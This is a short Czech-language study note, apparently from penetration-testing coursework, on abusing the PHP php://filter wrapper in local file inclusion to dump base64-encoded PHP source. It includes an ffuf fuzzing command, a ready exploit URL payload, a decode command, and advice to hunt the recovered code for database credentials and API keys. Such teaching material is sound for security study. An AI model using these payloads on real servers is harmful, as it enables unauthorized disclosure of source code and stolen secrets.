**PHP Filters (Wrapper `php://filter`) u LFI**

Použití PHP wrapperu `php://filter` představuje klíčovou techniku při analýze zranitelností LFI. Standardní LFI vyžaduje, aby server PHP soubor nejprve interpretoval a vykreslil (což vrátí pouze HTML výstup nebo prázdnou stránku). Pomocí konverzního filtru lze však PHP skript zakódovat ještě před jeho spuštěním a získat jeho kompletní zdrojový kód.

|**Parametr / Koncept**|**Syntaxe / Nástroj**|**Význam a funkce**|
|---|---|---|
|**Stream Wrapper**|`php://filter/`|Přístup k I/O streamům PHP pro aplikaci transformací na data.|
|**Konverzní filtr**|`read=convert.base64-encode`|Převede obsah souboru do formátu Base64, čímž zabrání jeho spuštění serverem.|
|**Cílový zdroj**|`resource=<soubor>`|Určuje soubor, který se má načíst (přípona `.php` bývá často doplňována automaticky).|
|**Fuzzování skriptů**|`ffuf -w wordlist.txt -u http://target/FUZZ.php`|Vyhledávání existujících PHP souborů na serveru (vč. kódů 301, 302, 403).|

**Postup exfiltrace zdrojových kódů**

1. **Obcházení spuštění kódu (Base64 Encoding)**
    
    Místo přímého načtení souboru (např. `language=config`) se předá řetězec wrapperu:
    
    Fragment kódu
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
    ```
    
2. **Získání zakódovaného řetězce**
    
    Aplikace vrátí textový řetězec v Base64 (např. `PD9waHAK...`).
    
3. **Dekódování na lokálním stroji**
    
    Získaný řetězec se v terminálu převede zpět do čitelného PHP kódu:
    
    Bash
    
    ```
    echo 'PD9waHAK...SNIP...' | base64 -d
    ```
    
4. **Analýza kódů**
    
    Ve získaném kódu lze hledat citlivé údaje (přihlašovací údaje k databázi, API klíče) nebo odkazy na další interní skripty, které lze následně stejným způsobem stahovat.